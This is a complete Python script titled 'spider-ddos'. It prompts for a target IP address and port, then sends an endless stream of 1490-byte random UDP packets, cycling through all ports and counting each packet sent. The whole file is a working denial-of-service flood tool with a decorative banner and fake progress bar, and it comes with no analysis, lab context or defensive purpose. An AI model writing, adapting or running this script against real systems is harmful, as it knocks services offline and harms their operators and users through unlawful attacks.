import sys
import os
import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
os.system("cls")

print('           _     _                ____  ____            ')
print(' ___ _ __ (_) __| | ___ _ __     |  _ \|  _ \  ___  ___ ')
print('/ __| \'_ \| |/ _` |/ _ \ \'__|____| | | | | | |/ _ \/ __|')
print('\\__ \\ |_) | | (_| |  __/ | |_____| |_| | |_| | (_) \\__ \\')
print('|___/ .__/|_|\__,_|\___|_|       |____/|____/ \___/|___/')
print('    |_|                                                 ')
print('________________________________________________________')

ip = input("IP Target : ")
port =int(input("Port      : "))

print('spider-ddos starting')
print('>>>         %0')
time.sleep(1)
print('>>>>>>      %25')
time.sleep(2)
print('>>>>>>>>>   %50')
time.sleep(1)
print('>>>>>>>>>>>>%100')
time.sleep(2)

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1